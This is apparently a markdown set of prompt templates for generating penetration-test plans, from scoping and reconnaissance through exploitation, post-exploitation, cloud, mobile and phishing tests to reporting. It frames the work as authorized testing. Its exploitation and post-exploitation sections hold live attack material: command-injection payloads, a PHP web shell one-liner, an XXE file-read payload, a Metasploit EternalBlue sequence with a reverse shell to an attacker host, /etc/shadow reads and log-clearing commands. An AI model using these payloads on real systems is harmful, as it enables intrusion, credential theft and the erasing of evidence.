# Penetration Testing Prompts

## 1. Penetration Test Planning and Scoping

```
Create a comprehensive penetration test plan:

Organization: [ORGANIZATION_NAME]
Target: [APPLICATION/NETWORK/INFRASTRUCTURE]
Test Type: [BLACK_BOX/GRAY_BOX/WHITE_BOX]
Duration: [TIMEFRAME]
Rules of Engagement: [CONSTRAINTS]

Test plan should include:
1. Scope Definition
   - In-scope systems/applications:
     * IP ranges: [IP_RANGES]
     * Domain names: [DOMAINS]
     * Applications: [APPLICATIONS]
     * APIs: [API_ENDPOINTS]

   - Out-of-scope items:
     * Production databases (read-only access only)
     * Third-party services
     * Social engineering (unless authorized)

2. Testing Methodology
   - Follow PTES (Penetration Testing Execution Standard)
   - OWASP Testing Guide for web applications
   - NIST SP 800-115

3. Test Phases
   - Pre-engagement interactions
   - Intelligence gathering
   - Threat modeling
   - Vulnerability analysis
   - Exploitation
   - Post-exploitation
   - Reporting

4. Objectives
   - Identify security vulnerabilities
   - Test incident detection and response
   - Validate security controls
   - Assess impact of successful attacks

5. Constraints and Limitations
   - Testing hours: [HOURS]
   - Notification requirements
   - DoS restrictions
   - Data handling requirements
   - Legal authorization confirmed

6. Success Criteria
   - Number of vulnerabilities found
   - Severity distribution
   - Proof of concepts delivered
   - Remediation recommendations

Generate:
- Detailed test plan document
- Risk assessment
- Authorization forms
- Testing checklist
```

## 2. Reconnaissance and Information Gathering

```
Generate reconnaissance test cases for:

Target: [TARGET_DOMAIN/ORGANIZATION]
Test Type: [PASSIVE/ACTIVE]

Test scenarios:
1. Passive Reconnaissance
   - WHOIS lookup
     whois [domain.com]

   - DNS enumeration (passive)
     nslookup [domain]
     dig [domain] ANY
     host [domain]

   - Subdomain discovery
     * theHarvester -d [domain] -b all
     * Sublist3r -d [domain]
     * Certificate Transparency logs: crt.sh

   - Email harvesting
     * theHarvester -d [domain] -b google
     * hunter.io search

   - Search engine reconnaissance
     * Google dorking:
       - site:[domain]
       - filetype:pdf site:[domain]
       - inurl:admin site:[domain]
       - intitle:"index of" site:[domain]

   - Social media intelligence
     * LinkedIn employee enumeration
     * GitHub repositories
     * Stack Overflow profiles
     * Twitter information leakage

   - Metadata analysis
     * FOCA for document metadata
     * ExifTool for image metadata

2. Active Reconnaissance
   - Port scanning
     nmap -sS -sV -p- [target]
     nmap -sU --top-ports 1000 [target]
     masscan -p1-65535 [target] --rate=1000

   - Service enumeration
     nmap -sV -sC [target]
     nmap --script=default [target]

   - Web application fingerprinting
     whatweb [url]
     wappalyzer
     builtwith.com

   - DNS zone transfer
     dig @[nameserver] [domain] AXFR
     host -l [domain] [nameserver]

   - Banner grabbing
     nc [target] [port]
     telnet [target] [port]

   - Network mapping
     nmap -sn [network_range]
     arp-scan --localnet

3. OSINT (Open Source Intelligence)
   - Company information
   - Employee names and roles
   - Technology stack
   - Network infrastructure
   - Security posture

Generate:
- Reconnaissance script collection
- Information gathering report
- Attack surface mapping
- Target profiling document
```

## 3. Vulnerability Assessment and Scanning

```
Create vulnerability assessment test plan:

Target: [TARGET_SYSTEM]
Environment: [PRODUCTION/STAGING/TEST]

Test scenarios:
1. Network Vulnerability Scanning
   - Nessus scan:
     * Full network scan
     * Credentialed scan
     * Web application scan
     * PCI DSS compliance scan

   - OpenVAS scan:
     * Comprehensive scan
     * Custom scan policy

   - Commands:
     nmap --script vuln [target]
     nmap --script=exploit [target]

2. Web Application Scanning
   - OWASP ZAP:
     * Automated scan
     * Spider + active scan
     * AJAX spider

   - Burp Suite:
     * Scan with Burp Scanner
     * Extension scans (Retire.js, etc.)

   - Nikto:
     nikto -h [url] -ssl -Tuning 123456789

   - WPScan (for WordPress):
     wpscan --url [url] --enumerate u,ap,at

3. SSL/TLS Security Testing
   - SSLyze:
     sslyze --regular [domain]:443

   - testssl.sh:
     ./testssl.sh [domain]

   - Checks:
     * Protocol versions (SSLv3, TLS 1.0, 1.1 deprecated)
     * Cipher suites (weak ciphers)
     * Certificate validity
     * BEAST, CRIME, POODLE vulnerabilities
     * Heartbleed

4. Wireless Network Testing
   - WiFi security assessment
   - WPA/WPA2 cracking
   - Evil twin attacks
   - Man-in-the-middle

   Tools:
   - Aircrack-ng suite
   - Wifite
   - Reaver (WPS attacks)

5. Configuration Review
   - Default credentials check
   - Unnecessary services
   - Weak configurations
   - Missing patches

6. Compliance Scanning
   - PCI DSS
   - HIPAA
   - GDPR
   - SOC 2

Generate:
- Vulnerability scan reports
- Prioritized findings
- False positive analysis
- Remediation timelines
```

## 4. Exploitation Testing

```
Generate exploitation test scenarios:

Target: [TARGET_APPLICATION/SYSTEM]
Vulnerabilities Identified: [LIST_VULNS]

Test scenarios:
1. Web Application Exploitation
   - SQL Injection exploitation
     sqlmap -u "[url]" --dbs
     sqlmap -u "[url]" -D [db] --tables
     sqlmap -u "[url]" -D [db] -T [table] --dump

   - Command injection
     Test payloads:
     ; ls -la
     | whoami
     & ipconfig
     `id`
     $(cat /etc/passwd)

   - File upload exploitation
     * Upload web shell
     * PHP shell: <?php system($_GET['cmd']); ?>
     * ASPX shell
     * Bypass file type restrictions

   - XXE exploitation
     Payload:
     <?xml version="1.0"?>
     <!DOCTYPE data [
     <!ELEMENT data ANY>
     <!ENTITY file SYSTEM "file:///etc/passwd">
     ]>
     <data>&file;</data>

2. Authentication Bypass
   - Brute force attacks
     hydra -L users.txt -P passwords.txt [target] http-post-form
     patator http_fuzz url=[url] method=POST body='user=FILE0&pass=FILE1'

   - JWT token manipulation
     * None algorithm attack
     * Weak signing key
     * JWT cracking with hashcat

   - Session hijacking
   - Cookie manipulation

3. Privilege Escalation
   Linux:
   - Kernel exploits
   - SUID binaries: find / -perm -4000 2>/dev/null
   - Sudo misconfigurations: sudo -l
   - Cron jobs
   - Weak file permissions

   Windows:
   - Token impersonation
   - Unquoted service paths
   - AlwaysInstallElevated
   - DLL hijacking
   - Registry keys

   Tools:
   - LinPEAS / WinPEAS
   - linux-exploit-suggester
   - windows-exploit-suggester

4. Network Exploitation
   - SMB exploits (EternalBlue)
   - RDP exploits
   - SSH attacks
   - FTP bounce attacks
   - DNS cache poisoning

   Metasploit example:
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOST [target]
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   set LHOST [attacker_ip]
   exploit

5. Client-Side Attacks
   - Phishing pages
   - Malicious file attachments
   - Drive-by downloads
   - Cross-site scripting
   - CSRF exploitation

6. Wireless Exploitation
   - WPA handshake capture
   - Dictionary attacks
   - Evil twin setup
   - Deauthentication attacks

Generate:
- Exploitation scripts
- Proof of concept code
- Step-by-step reproduction
- Impact assessment
```

## 5. Post-Exploitation Testing

```
Create post-exploitation test scenarios:

Access Gained: [LEVEL_OF_ACCESS]
System: [COMPROMISED_SYSTEM]

Test scenarios:
1. Privilege Escalation
   - Escalate from user to admin/root
   - Lateral movement preparation
   - Persistence mechanism testing

   Linux enumeration:
   id
   uname -a
   cat /etc/passwd
   cat /etc/shadow
   sudo -l
   find / -perm -4000 2>/dev/null
   cat /etc/crontab

   Windows enumeration:
   whoami /all
   systeminfo
   net user
   net localgroup administrators
   tasklist
   netstat -ano
   wmic qfe list

2. Data Exfiltration
   - Sensitive data identification
   - Data extraction methods
   - Covert channels
   - Data compression and encryption

   Sensitive data locations:
   - Database credentials
   - Configuration files
   - User files
   - Password managers
   - Browser saved passwords
   - SSH keys

   Exfiltration methods:
   - HTTP/HTTPS
   - DNS tunneling
   - ICMP tunneling
   - Email
   - Cloud storage

3. Persistence Mechanisms
   Linux:
   - Cron jobs
   - Systemd services
   - SSH keys
   - Backdoor accounts
   - Rootkits

   Windows:
   - Registry run keys
   - Scheduled tasks
   - Services
   - WMI event subscriptions
   - DLL hijacking

4. Lateral Movement
   - Network enumeration
   - Credential harvesting
   - Pass-the-hash attacks
   - Pass-the-ticket
   - Pivoting through compromised host

   Tools:
   - Mimikatz for credentials
   - CrackMapExec
   - BloodHound for AD mapping
   - Proxychains for pivoting

5. Covering Tracks
   - Log deletion
   - Timestamp manipulation
   - Event log clearing
   - History cleanup

   Linux:
   history -c
   rm ~/.bash_history
   unset HISTFILE

   Windows:
   wevtutil cl Security
   wevtutil cl System

Generate:
- Post-exploitation playbook
- Persistence scripts
- Data exfiltration methods
- Lateral movement paths
- Clean-up procedures
```

## 6. API Penetration Testing

```
Generate API penetration testing scenarios:

API: [API_NAME]
Type: [REST/SOAP/GraphQL]
Authentication: [OAUTH/JWT/API_KEY/BASIC]

Test scenarios:
1. API Discovery
   - Endpoint enumeration
   - Swagger/OpenAPI documentation
   - WADL files
   - API versioning

   Discovery methods:
   - /api/v1/docs
   - /swagger.json
   - /api-docs
   - Directory bruteforce: dirb [url] wordlist

2. Authentication Testing
   - Weak authentication schemes
   - API key in URL
   - Token leakage
   - Token expiration
   - Token revocation

   Tests:
   - Test without authentication
   - Test with expired tokens
   - Test with revoked tokens
   - Brute force API keys

3. Authorization Testing
   - BOLA (Broken Object Level Authorization)
   - BFLA (Broken Function Level Authorization)
   - Mass assignment
   - IDOR in API

   Example:
   GET /api/users/123/profile
   GET /api/users/456/profile (should fail)

   POST /api/users/123/update
   Body: {"role": "admin"} (mass assignment)

4. Input Validation
   - Injection attacks
   - XXE in XML APIs
   - NoSQL injection
   - Buffer overflow
   - Mass assignment

5. Rate Limiting and DoS
   - No rate limiting
   - Resource exhaustion
   - Regex DoS
   - XML bomb

   Test:
   - Send 10000 requests rapidly
   - Large payload testing
   - Nested JSON/XML

6. Business Logic
   - Negative quantities
   - Price manipulation
   - Workflow bypass
   - Race conditions

7. Data Exposure
   - Excessive data exposure
   - Sensitive data in responses
   - Error messages with stack traces
   - Version disclosure

8. GraphQL Specific
   - Introspection queries
   - Batching attacks
   - Nested queries DoS
   - Field suggestion abuse

   Introspection query:
   {
     __schema {
       types {
         name
         fields {
           name
         }
       }
     }
   }

Generate:
- API test collection (Postman/Burp)
- Authentication bypass tests
- BOLA/BFLA test cases
- Rate limiting tests
```

## 7. Mobile Application Penetration Testing

```
Create mobile application penetration testing plan:

Application: [APP_NAME]
Platform: [iOS/ANDROID/BOTH]
Version: [VERSION]

Test scenarios:
1. Static Analysis (Android)
   - APK reverse engineering
     apktool d [app.apk]
     jadx [app.apk]
     dex2jar [app.apk]

   - Manifest analysis
     * Permissions review
     * Exported components
     * Debug mode enabled
     * Backup allowed

   - Hardcoded secrets
     * API keys
     * Encryption keys
     * Passwords
     * URLs

   - Code obfuscation check
   - Root detection bypass

2. Static Analysis (iOS)
   - IPA extraction
   - Binary analysis with Hopper/IDA
   - Plist file examination
   - Keychain analysis
   - Certificate pinning check

3. Dynamic Analysis
   - Man-in-the-middle testing
     * Burp Suite proxy
     * Certificate pinning bypass
     * mitmproxy

   - Runtime manipulation
     * Frida hooking
     * Objection framework
     * Method swizzling

   - Data storage analysis
     * Shared preferences (Android)
     * SQLite databases
     * Internal storage
     * External storage
     * Keychain (iOS)

4. Network Communication
   - Unencrypted HTTP
   - Certificate validation
   - SSL pinning bypass
   - API security
   - Insecure protocols

5. Authentication and Session
   - Insecure storage of credentials
   - Weak session management
   - Biometric bypass
   - PIN bypass
   - OAuth implementation

6. Business Logic
   - Client-side controls
   - Price manipulation
   - Feature unlocking
   - In-app purchase bypass

7. Local Data Storage
   - Sensitive data in logs
   - Sensitive data in cache
   - Clipboard leakage
   - Screenshot security

8. Binary Protection
   - Anti-debugging
   - Anti-tampering
   - Root/jailbreak detection
   - Code obfuscation

Generate:
- Mobile app test checklist
- Frida scripts
- Proxy configuration guide
- Tool setup instructions
```

## 8. Cloud Infrastructure Penetration Testing

```
Generate cloud penetration testing scenarios:

Cloud Provider: [AWS/AZURE/GCP]
Services: [LIST_SERVICES]

Test scenarios:
1. AWS Security Testing
   - S3 bucket enumeration
     aws s3 ls s3://[bucket-name] --no-sign-request

   - S3 misconfigurations
     * Public read/write access
     * Bucket policies
     * ACL misconfigurations

   - IAM assessment
     * Excessive permissions
     * Password policy
     * MFA enforcement
     * Access key rotation

   - EC2 security
     * Security group misconfigurations
     * IMDSv1 usage
     * Unencrypted volumes
     * Public snapshots

   - Lambda security
     * Function permissions
     * Environment variables
     * Layer security

2. Azure Security Testing
   - Storage account access
   - Azure AD misconfigurations
   - Key Vault security
   - NSG rule review
   - RBAC assessment

3. GCP Security Testing
   - Cloud Storage buckets
   - IAM bindings
   - Firewall rules
   - Service accounts
   - GKE security

4. Container Security
   - Docker image vulnerabilities
     docker scan [image]
     trivy image [image]

   - Kubernetes misconfigurations
     * Exposed dashboard
     * RBAC issues
     * Pod security policies
     * Network policies
     * Secrets management

5. Cloud Metadata Services
   - AWS: http://169.254.169.254/
   - Azure: http://169.254.169.254/metadata/
   - GCP: http://metadata.google.internal/

6. Resource Enumeration
   - Subdomain takeover
   - Open databases
   - Exposed snapshots
   - Public IPs

Generate:
- Cloud security assessment
- IAM audit script
- Resource enumeration tool
- Misconfiguration scanner
```

## 9. Social Engineering Testing

```
Create social engineering test plan:

Organization: [ORGANIZATION_NAME]
Authorization: [WRITTEN_AUTHORIZATION_REQUIRED]
Scope: [PHISHING/VISHING/PHYSICAL]

Test scenarios:
1. Phishing Campaigns
   - Email phishing
     * Credential harvesting
     * Malware delivery
     * Link clicking measurement

   - Spear phishing
     * Targeted emails
     * Personalized content
     * Executive impersonation

   - Whaling
     * C-level targeting
     * Business email compromise

   Templates:
   - IT support password reset
   - HR policy update
   - Payroll changes
   - Invoice payment
   - Package delivery

2. Vishing (Voice Phishing)
   - IT helpdesk impersonation
   - Executive assistant pretexting
   - Vendor impersonation
   - Emergency scenarios

3. Smishing (SMS Phishing)
   - Account alerts
   - Package notifications
   - Security warnings
   - Multi-factor code requests

4. Physical Security
   - Tailgating
   - Badge cloning
   - Dumpster diving
   - Shoulder surfing
   - Dropped USB devices

5. Pretexting Scenarios
   - IT contractor
   - Delivery person
   - Fire inspector
   - Cleaning crew
   - Temp worker

Tools:
- GoPhish for phishing campaigns
- Social Engineering Toolkit (SET)
- King Phisher
- Evilginx2 for advanced phishing

Generate:
- Phishing campaign plan
- Email templates
- Landing page mockups
- Success metrics
- Awareness training recommendations
```

## 10. Reporting and Documentation

```
Create penetration testing report structure:

Engagement: [ENGAGEMENT_NAME]
Client: [CLIENT_NAME]
Test Period: [DATES]

Report sections:
1. Executive Summary
   - High-level overview
   - Key findings
   - Risk summary
   - Recommendations

2. Scope and Methodology
   - Testing scope
   - Methodology used
   - Testing timeline
   - Limitations

3. Technical Findings
   For each vulnerability:
   - Title
   - Severity (Critical/High/Medium/Low)
   - Description
   - Affected systems/components
   - Steps to reproduce
   - Proof of concept
   - Screenshots/evidence
   - Business impact
   - Technical impact
   - Remediation recommendations
   - References (CVE, CWE)

4. Risk Assessment
   - Risk matrix
   - Threat likelihood
   - Impact analysis
   - Overall risk score

5. Exploitation Timeline
   - Attack path diagram
   - Kill chain mapping
   - Lateral movement visualization

6. Remediation Guidance
   - Prioritized action items
   - Quick wins
   - Long-term recommendations
   - Secure configuration guides

7. Appendices
   - Tool output
   - Scan results
   - Network diagrams
   - Payload listings

Severity Ratings:
- Critical: Immediate exploitation, severe impact
- High: Easily exploitable, significant impact
- Medium: Moderate difficulty, moderate impact
- Low: Difficult exploitation, minimal impact
- Informational: No immediate security impact

Generate:
- Executive summary template
- Finding template
- Remediation roadmap
- Metrics and KPIs
```

## Best Practices

1. **Legal Authorization**
   - Written permission required
   - Scope clearly defined
   - Rules of engagement documented
   - Incident response contacts established

2. **Ethical Considerations**
   - Do no harm
   - Respect privacy
   - Maintain confidentiality
   - Follow scope strictly

3. **Safety Measures**
   - Backup before testing
   - Test on copies when possible
   - Avoid DoS in production
   - Have rollback plan

4. **Documentation**
   - Document everything
   - Time-stamp activities
   - Screenshot evidence
   - Maintain chain of custody

5. **Communication**
   - Regular status updates
   - Immediate critical finding notification
   - Clear reporting
   - Debrief session

## Tools Arsenal

**Reconnaissance:**
- theHarvester, Recon-ng, Maltego, Shodan

**Scanning:**
- Nmap, Masscan, Nessus, OpenVAS

**Web Application:**
- Burp Suite, OWASP ZAP, SQLMap, XSSer

**Exploitation:**
- Metasploit, Empire, Cobalt Strike, BeEF

**Post-Exploitation:**
- Mimikatz, BloodHound, PowerSploit, LinEnum

**Mobile:**
- MobSF, Frida, Objection, Drozer

**Cloud:**
- ScoutSuite, Prowler, CloudMapper, Pacu

**Social Engineering:**
- SET, GoPhish, King Phisher

## Penetration Testing Checklist

- [ ] Legal authorization obtained
- [ ] Scope clearly defined
- [ ] Testing environment prepared
- [ ] Reconnaissance completed
- [ ] Vulnerability assessment done
- [ ] Exploitation tested
- [ ] Post-exploitation performed
- [ ] All findings documented
- [ ] Proof of concepts created
- [ ] Report drafted
- [ ] Client debriefing scheduled
- [ ] Secure file transfer for report
- [ ] Evidence securely stored
- [ ] Re-test after remediation planned
